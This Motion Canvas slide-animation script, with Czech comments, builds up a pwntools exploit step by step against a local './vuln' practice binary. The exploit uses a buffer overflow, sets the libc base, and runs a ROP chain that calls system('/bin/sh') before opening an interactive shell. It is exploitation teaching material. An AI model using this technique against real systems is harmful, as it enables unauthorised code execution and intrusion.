import {Circle, Layout, Ray, Rect, Txt, makeScene2D} from '@motion-canvas/2d';
import { CodeBlock, lines } from '@motion-canvas/2d/lib/components/CodeBlock';
import {Reference, all, beginSlide, createRef, createSignal} from '@motion-canvas/core';

const BACKGROUND = '#282C34';
const RED = '#E06C75';
const GREEN = '#98C379';
const YELLOW = '#E5C07B';
const BLUE = '#61AFEF';
const MAGENTA = '#C678DD';
const CYAN = '#56B6C2';
const GRAY = '#ABB2BF';
const WHITE = '#FFFFFF';
const BLACK = '#000000';

export default makeScene2D(function* (view) {
    let cref = createRef<CodeBlock>();
    yield view.add(
        <CodeBlock
            code={"from pwm import *"}
            language='python'
            ref={cref}
        />);
    yield* beginSlide("first");

    cref().code(`from pwm import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
# nebo "kitty" a podobně`);
    yield* cref().fontSize(30, .1);
    yield* beginSlide("setup");

    cref().code(`from pwm import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
# nebo "kitty" a podobně

io = process(["./vuln"])
#io = remote("host", port)
#io = gdb.debug("./vuln")
`);
    yield* cref().fontSize(24, .1);

    yield* beginSlide("setup2");


    cref().code(`from pwm import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
# nebo "kitty" a podobně

io = process(["./vuln"])
#io = remote("host", port)
#io = gdb.debug("./vuln")

bin = ELF("./vuln")
libc = ELF("./libc.so.6")
`);

    yield* beginSlide("setup3");


    cref().code(`from pwm import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
# nebo "kitty" a podobně

io = process(["./vuln"])
#io = remote("host", port)
#io = gdb.debug("./vuln")

bin = ELF("./vuln")
libc = ELF("./libc.so.6")

io.recvuntil(b"Input: ")
io.sendline(b"Hello, world!")
`);

    yield* beginSlide("io.sendline")

    cref().code(`from pwm import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
# nebo "kitty" a podobně

io = process(["./vuln"])
#io = remote("host", port)
#io = gdb.debug("./vuln")

bin = ELF("./vuln")
libc = ELF("./libc.so.6")

io.recvuntil(b"Input: ")
io.sendline(b"Hello, world!")

io.recvuntil(b"code: ")
line = io.recvline()
code = int(line.strip(), 16)
`);

    yield* beginSlide("code")


    cref().code(`from pwm import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
# nebo "kitty" a podobně

io = process(["./vuln"])
#io = remote("host", port)
#io = gdb.debug("./vuln")

bin = ELF("./vuln")
libc = ELF("./libc.so.6")

io.recvuntil(b"Input: ")
io.sendline(b"Hello, world!")

io.recvuntil(b"code: ")
line = io.recvline()
code = int(line.strip(), 16)

io.sendline(flat({
    0x8: 1,
    72: code,
}))
`);

    yield* beginSlide("flat")


    cref().code(`from pwm import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
# nebo "kitty" a podobně

io = process(["./vuln"])
#io = remote("host", port)
#io = gdb.debug("./vuln")

bin = ELF("./vuln")
libc = ELF("./libc.so.6")

io.recvuntil(b"Input: ")
io.sendline(b"Hello, world!")

io.recvuntil(b"code: ")
line = io.recvline()
code = int(line.strip(), 16)

io.sendline(flat({
    0x8: 1,
    72: code,
}))

offset = int(io.recvline(), 16)
libc.address = offset
`);

    yield* beginSlide("offset")


    cref().code(`from pwm import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
# nebo "kitty" a podobně

io = process(["./vuln"])
#io = remote("host", port)
#io = gdb.debug("./vuln")

bin = ELF("./vuln")
libc = ELF("./libc.so.6")

io.recvuntil(b"Input: ")
io.sendline(b"Hello, world!")

io.recvuntil(b"code: ")
line = io.recvline()
code = int(line.strip(), 16)

io.sendline(flat({
    0x8: 1,
    72: code,
}))

offset = int(io.recvline(), 16)
libc.address = offset

rop = ROP(libc, badchars=b'\\n')
rop.call(libc.sym["system"], [next(libc.search(b"/bin/sh"))])
rop.call(libc.sym["exit"], [0])
`);

    yield* beginSlide("rop")


    cref().code(`from pwm import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
# nebo "kitty" a podobně

io = process(["./vuln"])
#io = remote("host", port)
#io = gdb.debug("./vuln")

bin = ELF("./vuln")
libc = ELF("./libc.so.6")

io.recvuntil(b"Input: ")
io.sendline(b"Hello, world!")

io.recvuntil(b"code: ")
line = io.recvline()
code = int(line.strip(), 16)

io.sendline(flat({
    0x8: 1,
    72: code,
}))

offset = int(io.recvline(), 16)
libc.address = offset

rop = ROP(libc, badchars=b'\\n')
rop.call(libc.sym["system"], [next(libc.search(b"/bin/sh"))])
rop.call(libc.sym["exit"], [0])

io.sendline(rop.chain())
`);

    yield* beginSlide("send rop")


    cref().code(`from pwm import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]
# nebo "kitty" a podobně

io = process(["./vuln"])
#io = remote("host", port)
#io = gdb.debug("./vuln")

bin = ELF("./vuln")
libc = ELF("./libc.so.6")

io.recvuntil(b"Input: ")
io.sendline(b"Hello, world!")

io.recvuntil(b"code: ")
line = io.recvline()
code = int(line.strip(), 16)

io.sendline(flat({
    0x8: 1,
    72: code,
}))

offset = int(io.recvline(), 16)
libc.address = offset

rop = ROP(libc, badchars=b'\\n')
rop.call(libc.sym["system"], [next(libc.search(b"/bin/sh"))])
rop.call(libc.sym["exit"], [0])

io.sendline(rop.chain())

io.interactive()
`);

    yield* beginSlide("interactive")
});
